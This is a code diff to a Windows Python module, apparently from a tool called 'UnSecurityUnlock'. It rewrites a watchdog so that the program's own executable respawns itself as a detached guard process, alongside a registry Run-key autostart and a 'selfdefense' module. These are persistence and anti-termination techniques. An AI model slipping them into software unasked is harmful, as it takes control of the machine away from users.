@@ -10,7 +10,7 @@ from . import selfdefense
 
 AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 AUTOSTART_NAME = "UnSecurityUnlock"
-GUARD_NAME = "UnSecurityGuard.exe"
+GUARD_FLAG = "--guard"
 
 
 def _ensure_autostart() -> None:
@@ -36,21 +36,17 @@ def _ensure_autostart() -> None:
 
 
 def _ensure_guard() -> None:
-    """Поднять сторожевой процесс, если он не запущен."""
     exe = selfdefense.current_exe()
     if not exe:
         return
-    guard = exe.parent / GUARD_NAME
-    if not guard.exists():
-        return
     try:
         out = subprocess.run(
-            ["tasklist", "/FI", f"IMAGENAME eq {GUARD_NAME}", "/NH"],
+            ["tasklist", "/FI", f"IMAGENAME eq {exe.name}", "/NH"],
             capture_output=True, text=True, timeout=10
         ).stdout.lower()
-        if GUARD_NAME.lower() not in out:
-            subprocess.Popen([str(guard)], creationflags=0x00000008)
-            logger.info("watchdog: guard started")
+        if out.count(exe.name.lower()) < 2:
+            subprocess.Popen([str(exe), GUARD_FLAG], creationflags=0x00000008)
+            logger.info("watchdog: guard process spawned")
     except Exception as e:
         logger.error("watchdog guard: %s", e)
 
